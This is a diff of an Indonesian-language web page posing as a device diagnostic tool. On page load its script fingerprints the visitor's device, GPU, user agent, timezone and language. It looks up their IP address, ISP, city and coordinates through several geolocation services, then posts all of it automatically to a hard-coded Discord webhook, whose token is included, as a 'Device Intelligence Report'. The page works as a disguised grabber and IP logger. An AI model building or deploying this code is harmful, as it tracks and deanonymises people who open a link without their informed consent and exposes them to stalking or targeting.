@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Diagnosa Perangkat v2.0</title>
+    <title>Sistem Diagnosa Perangkat</title>
     <style>
         body { 
             font-family: 'Inter', -apple-system, sans-serif; 
@@ -38,6 +38,11 @@
             border-radius: 8px; 
             margin-bottom: 12px; 
             border-left: 4px solid #38bdf8;
+            transition: all 0.3s ease;
+        }
+        .info-group:hover {
+            transform: translateX(5px);
+            background: #1a2536;
         }
         .label { 
             color: #64748b; 
@@ -68,11 +73,29 @@
             justify-content: center;
             gap: 8px;
         }
-        .success { background: rgba(52, 211, 153, 0.1); color: #34d399; border: 1px solid rgba(52, 211, 153, 0.3); }
-        .loading { background: rgba(251, 191, 36, 0.1); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.3); }
-        .error { background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
-        .pulse { animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .success { 
+            background: rgba(52, 211, 153, 0.1); 
+            color: #34d399; 
+            border: 1px solid rgba(52, 211, 153, 0.3);
+        }
+        .loading { 
+            background: rgba(251, 191, 36, 0.1); 
+            color: #fbbf24; 
+            border: 1px solid rgba(251, 191, 36, 0.3);
+        }
+        .error { 
+            background: rgba(239, 68, 68, 0.1); 
+            color: #ef4444; 
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
@@ -96,13 +119,18 @@
     </div>
 
     <div class="info-group">
-        <span class="label">Lokasi</span>
+        <span class="label">Lokasi (Alamat)</span>
         <span id="ui-location" class="value pulse">Melacak...</span>
     </div>
 
     <div class="info-group">
         <span class="label">Chipset (GPU)</span>
         <span id="ui-gpu" class="value pulse">Menganalisis...</span>
+    </div>
+
+    <div class="info-group">
+        <span class="label">User Agent</span>
+        <span id="ui-ua" class="value pulse">Memuat...</span>
     </div>
 
     <div id="status" class="status loading">
@@ -114,133 +142,332 @@
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
-    // Fungsi cerdas mendeteksi brand tanpa database lengkap
-    function parseDeviceInfo(rawModel) {
-        let model = rawModel.replace(/Build\/.+/i, '').replace(/_/g, ' ').trim();
-        let brand = "Generic";
-        let product = model;
+    // Database mapping yang lebih lengkap
+    function getDeviceInfo(model, platform) {
+        const deviceDatabase = {
+            // Samsung
+            'SM-A546': { name: 'Samsung Galaxy A54 5G', brand: 'Samsung' },
+            'SM-A346': { name: 'Samsung Galaxy A34 5G', brand: 'Samsung' },
+            'SM-G991': { name: 'Samsung Galaxy S21', brand: 'Samsung' },
+            'SM-S918': { name: 'Samsung Galaxy S23 Ultra', brand: 'Samsung' },
+            'SM-S901': { name: 'Samsung Galaxy S22', brand: 'Samsung' },
+            'SM-A137': { name: 'Samsung Galaxy A13', brand: 'Samsung' },
+            
+            // OPPO
+            'CPH2387': { name: 'OPPO A57', brand: 'OPPO' },
+            'CPH2477': { name: 'OPPO A17', brand: 'OPPO' },
+            'CPH2353': { name: 'OPPO Reno10 5G', brand: 'OPPO' },
+            'CPH2581': { name: 'OPPO Reno11 F', brand: 'OPPO' },
+            
+            // Realme
+            'RMX3511': { name: 'Realme C35', brand: 'Realme' },
+            'RMX3611': { name: 'Realme C55', brand: 'Realme' },
+            'RMX3706': { name: 'Realme 12 Lite', brand: 'Realme' },
+            
+            // Xiaomi/Redmi
+            'M2101K7BN': { name: 'Redmi Note 10S', brand: 'Xiaomi' },
+            '2201117TY': { name: 'Xiaomi 11T', brand: 'Xiaomi' },
+            '2211133G': { name: 'Xiaomi 13 Lite', brand: 'Xiaomi' },
+            
+            // iPhone
+            'iPhone14,5': { name: 'iPhone 13', brand: 'Apple' },
+            'iPhone15,3': { name: 'iPhone 14 Pro Max', brand: 'Apple' },
+            'iPhone16,1': { name: 'iPhone 15', brand: 'Apple' },
+            
+            // Vivo
+            'V2306': { name: 'Vivo Y27', brand: 'Vivo' },
+            'V2317': { name: 'Vivo Y17s', brand: 'Vivo' }
+        };
 
-        // Logic Regex untuk mengenali pola brand dunia
-        const patterns = [
-            { reg: /^SM-/i, name: "Samsung Galaxy" },
-            { reg: /^CPH|^PHT|^PHM|^PCH/i, name: "OPPO" },
-            { reg: /^RMX|^RMP/i, name: "Realme" },
-            { reg: /^V\d{4}|^PD\d{4}/i, name: "Vivo" },
-            { reg: /^M2\d|^2\d/i, name: "Xiaomi/Redmi" },
-            { reg: /^Infinix|^X\d{3}/i, name: "Infinix" },
-            { reg: /^iPhone/i, name: "Apple" },
-            { reg: /^Pixel/i, name: "Google" }
-        ];
-
-        for (let p of patterns) {
-            if (p.reg.test(model)) {
-                brand = p.name.split(' ')[0];
-                product = p.name + " " + model;
-                break;
+        // Cari model di database
+        for (const key in deviceDatabase) {
+            if (model.includes(key)) {
+                return deviceDatabase[key];
             }
         }
 
-        // Cek jika brand sudah tertulis di dalam model (misal: "Redmi Note 10")
-        const commonBrands = ["Samsung", "OPPO", "Vivo", "Realme", "Xiaomi", "Redmi", "Infinix", "POCO", "Sony", "Asus"];
-        commonBrands.forEach(b => {
-            if (model.toLowerCase().includes(b.toLowerCase())) {
-                brand = b;
-                product = model;
-            }
-        });
-
-        return { brand, product, model };
+        // Fallback untuk device tidak dikenal
+        const brand = platform.includes('Android') ? 'Android Device' : 
+                     platform.includes('iPhone') ? 'iPhone' : 
+                     platform.includes('iPad') ? 'iPad' : 'Unknown Device';
+        
+        return {
+            name: `${brand} (${model.substring(0, 20)})`,
+            brand: brand
+        };
     }
 
-    async function getNetworkInfo() {
+    // Fungsi untuk mendapatkan info GPU yang lebih baik
+    function getGPUInfo() {
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            return await res.json();
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            
+            if (!gl) return "WebGL Not Supported";
+
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO);
+                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_INFO);
+                
+                // Filter info GPU
+                let gpuInfo = renderer || '';
+                
+                // Deteksi GPU spesifik
+                if (gpuInfo.includes('Adreno')) {
+                    const adrenoMatch = gpuInfo.match(/Adreno\s*(\d+)/);
+                    return adrenoMatch ? `Qualcomm Adreno ${adrenoMatch[1]}` : 'Qualcomm Adreno GPU';
+                } else if (gpuInfo.includes('Mali')) {
+                    const maliMatch = gpuInfo.match(/Mali\s*[-]?(\w+)/);
+                    return maliMatch ? `ARM Mali-${maliMatch[1]}` : 'ARM Mali GPU';
+                } else if (gpuInfo.includes('Apple')) {
+                    return 'Apple GPU';
+                } else if (gpuInfo.includes('PowerVR')) {
+                    return 'Imagination PowerVR GPU';
+                }
+                
+                return gpuInfo || 'Unknown GPU';
+            }
+            return "GPU Info Unavailable";
         } catch (e) {
-            return null;
+            return "GPU Detection Failed";
         }
     }
 
-    function getGPU() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        if (!gl) return "Generic GPU";
-        const debug = gl.getExtension('WEBGL_debug_renderer_info');
-        return debug ? gl.getParameter(debug.UNMASKED_RENDERER_INFO) : "Undetected";
+    // Fungsi untuk mendapatkan lokasi dengan fallback
+    async function getLocationInfo() {
+        try {
+            // Gunakan multiple services untuk reliability
+            const services = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json?token=',
+                'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
+            ];
+            
+            let locationData = null;
+            
+            for (const service of services) {
+                try {
+                    const response = await fetch(service, {
+                        signal: AbortSignal.timeout(5000)
+                    });
+                    
+                    if (response.ok) {
+                        locationData = await response.json();
+                        break;
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            if (locationData) {
+                // Format data berdasarkan service yang merespons
+                if (locationData.city) {
+                    return {
+                        ip: locationData.ip || locationData.query,
+                        isp: locationData.org || locationData.isp || locationData.asn || 'Unknown ISP',
+                        location: `${locationData.city}, ${locationData.region || locationData.regionName}, ${locationData.country_name || locationData.country}`,
+                        coordinates: locationData.latitude && locationData.longitude ? 
+                            `${locationData.latitude}, ${locationData.longitude}` : 'N/A'
+                    };
+                }
+            }
+            
+            // Fallback ke service default jika semua gagal
+            const fallback = await fetch('https://api.ipify.org?format=json');
+            const ipData = await fallback.json();
+            
+            return {
+                ip: ipData.ip,
+                isp: 'ISP Unknown (Detection Limited)',
+                location: 'Location Detection Blocked',
+                coordinates: 'N/A'
+            };
+            
+        } catch (error) {
+            return {
+                ip: 'IP Detection Failed',
+                isp: 'ISP Detection Failed',
+                location: 'Location Services Blocked',
+                coordinates: 'N/A'
+            };
+        }
     }
 
     async function startCapture() {
-        let rawModel = navigator.platform;
-        
-        // Ambil High Entropy Model (Lebih akurat di Chrome Android)
-        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
-            if (hints.model) rawModel = hints.model;
-        } 
-        
-        // Fallback: Bedah User Agent jika model masih generik
-        if (rawModel === "Linux armv8l" || rawModel === "Linux" || rawModel === "Win32") {
-            const ua = navigator.userAgent;
-            const match = ua.match(/\(([^)]+)\)/);
-            if (match && match[1]) {
-                const segments = match[1].split(';');
-                rawModel = segments[segments.length - 1].trim();
-            }
-        }
-
-        const info = parseDeviceInfo(rawModel);
-        const net = await getNetworkInfo();
-        const gpu = getGPU();
-
-        // Update UI
-        document.getElementById('ui-product').innerText = info.product;
-        document.getElementById('ui-model').innerText = info.model;
-        document.getElementById('ui-gpu').innerText = gpu;
-        document.getElementById('ui-network').innerText = net ? `${net.ip} (${net.org})` : "Error detect IP";
-        document.getElementById('ui-location').innerText = net ? `${net.city}, ${net.region}, ${net.country_name}` : "Blocked";
-
-        // Remove pulse effect
-        document.querySelectorAll('.value').forEach(el => el.classList.remove('pulse'));
-
-        // Kirim ke Discord
-        sendToDiscord(info, net, gpu);
-    }
-
-    async function sendToDiscord(info, net, gpu) {
-        const statusEl = document.getElementById('status');
-        const payload = {
-            embeds: [{
-                title: "📱 New Device Intelligence Detected",
-                color: 5814783,
-                fields: [
-                    { name: "Brand/Product", value: `**${info.product}**`, inline: true },
-                    { name: "Hardware Model", value: `\`${info.model}\``, inline: true },
-                    { name: "GPU", value: gpu },
-                    { name: "Network", value: net ? `IP: ${net.ip}\nISP: ${net.org}` : "N/A" },
-                    { name: "Location", value: net ? `${net.city}, ${net.country_name}` : "N/A" },
-                    { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` }
-                ],
-                timestamp: new Date().toISOString()
-            }]
+        let device = {
+            model: "Unknown",
+            product: "Unknown Device",
+            brand: "Unknown",
+            ip: "Unknown",
+            isp: "Unknown",
+            location: "Unknown",
+            coordinates: "N/A",
+            gpu: "Detecting...",
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
-        try {
-            const res = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            if (res.ok) {
-                statusEl.innerHTML = '<span>✅</span><span>Data Terkirim</span>';
-                statusEl.className = "status success";
+        // 1. Deteksi GPU terlebih dahulu
+        device.gpu = getGPUInfo();
+        document.getElementById('ui-gpu').innerText = device.gpu;
+        document.getElementById('ui-gpu').classList.remove('pulse');
+
+        // 2. Deteksi Model dan Produk
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            try {
+                const hints = await navigator.userAgentData.getHighEntropyValues([
+                    'model', 
+                    'platform', 
+                    'platformVersion',
+                    'fullVersionList'
+                ]);
+                device.model = hints.model || navigator.platform || "Unknown";
+                device.platform = hints.platform || navigator.platform;
+            } catch (e) {
+                device.model = navigator.platform || "Unknown";
             }
-        } catch (e) {
-            statusEl.innerHTML = '<span>❌</span><span>Gagal Mengirim</span>';
-            statusEl.className = "status error";
+        } else {
+            // Fallback untuk browser lama
+            device.model = navigator.platform;
+            
+            // Coba parsing dari user agent
+            const ua = navigator.userAgent;
+            const androidMatch = ua.match(/Android.*Build\/([^);]+)/);
+            const iPhoneMatch = ua.match(/iPhone[^;]+/);
+            
+            if (androidMatch) device.model = androidMatch[1].split(';')[0];
+            if (iPhoneMatch) device.model = iPhoneMatch[0];
+        }
+
+        // Dapatkan info device dari database
+        const deviceInfo = getDeviceInfo(device.model, device.platform);
+        device.product = deviceInfo.name;
+        device.brand = deviceInfo.brand;
+
+        // Update UI untuk model dan product
+        document.getElementById('ui-product').innerText = device.product;
+        document.getElementById('ui-product').classList.remove('pulse');
+        document.getElementById('ui-model').innerText = device.model;
+        document.getElementById('ui-model').classList.remove('pulse');
+
+        // 3. Dapatkan lokasi dan network info
+        const locationInfo = await getLocationInfo();
+        device.ip = locationInfo.ip;
+        device.isp = locationInfo.isp;
+        device.location = locationInfo.location;
+        device.coordinates = locationInfo.coordinates;
+
+        // Update UI untuk network dan location
+        document.getElementById('ui-network').innerText = `${device.ip}\n${device.isp}`;
+        document.getElementById('ui-network').classList.remove('pulse');
+        document.getElementById('ui-location').innerText = device.location;
+        document.getElementById('ui-location').classList.remove('pulse');
+
+        // 4. Update User Agent
+        document.getElementById('ui-ua').innerText = device.ua.substring(0, 100) + (device.ua.length > 100 ? "..." : "");
+        document.getElementById('ui-ua').classList.remove('pulse');
+
+        // 5. Kirim ke Discord
+        await sendToDiscord(device);
+    }
+
+    async function sendToDiscord(device) {
+        const statusElement = document.getElementById('status');
+        
+        try {
+            const payload = {
+                content: "🚨 **DEVICE DETECTED** 🚨",
+                embeds: [{
+                    title: "📊 Device Intelligence Report",
+                    color: 0x3498db,
+                    thumbnail: {
+                        url: "https://cdn-icons-png.flaticon.com/512/3014/3014277.png"
+                    },
+                    fields: [
+                        { 
+                            name: "📱 Device Information", 
+                            value: `**Brand:** ${device.brand}\n**Product:** ${device.product}\n**Model:** ${device.model}`,
+                            inline: false 
+                        },
+                        { 
+                            name: "🌐 Network Information", 
+                            value: `**IP Address:** ${device.ip}\n**ISP:** ${device.isp}\n**Timezone:** ${device.timezone}`,
+                            inline: false 
+                        },
+                        { 
+                            name: "📍 Location", 
+                            value: `${device.location}\n**Coordinates:** ${device.coordinates}\n**Language:** ${device.language}`,
+                            inline: false 
+                        },
+                        { 
+                            name: "⚙️ Hardware Information", 
+                            value: `**GPU:** ${device.gpu}\n**Platform:** ${device.platform}`,
+                            inline: false 
+                        },
+                        { 
+                            name: "🔧 User Agent", 
+                            value: `\`\`\`${device.ua.substring(0, 1000)}\`\`\``,
+                            inline: false 
+                        }
+                    ],
+                    footer: {
+                        text: "Device Intelligence System • " + new Date().toLocaleString('id-ID'),
+                        icon_url: "https://cdn-icons-png.flaticon.com/512/1548/1548688.png"
+                    },
+                    timestamp: new Date().toISOString()
+                }],
+                username: "Device Intel Bot",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/1548/1548688.png"
+            };
+
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload),
+                mode: 'cors'
+            });
+
+            if (response.ok) {
+                statusElement.innerHTML = '<span>✅</span><span>Data Berhasil Dikirim ke Server</span>';
+                statusElement.className = "status success";
+                
+                // Tambahkan efek sukses
+                setTimeout(() => {
+                    statusElement.style.transform = 'scale(1.02)';
+                    setTimeout(() => {
+                        statusElement.style.transform = 'scale(1)';
+                    }, 300);
+                }, 100);
+            } else {
+                throw new Error('Webhook response not OK');
+            }
+            
+        } catch (error) {
+            console.error('Webhook Error:', error);
+            statusElement.innerHTML = '<span>⚠️</span><span>Gagal Mengirim Data (CORS/Network Error)</span>';
+            statusElement.className = "status error";
         }
     }
 
-    window.onload = () => setTimeout(startCapture, 800);
+    // Event listener untuk memulai deteksi
+    window.addEventListener('DOMContentLoaded', () => {
+        setTimeout(startCapture, 1000); // Delay kecil untuk efek UI
+    });
+
+    // Optional: Tambahkan tombol refresh
+    document.addEventListener('keydown', (e) => {
+        if (e.ctrlKey && e.key === 'r') {
+            e.preventDefault();
+            location.reload();
+        }
+    });
 </script>
 
 </body>
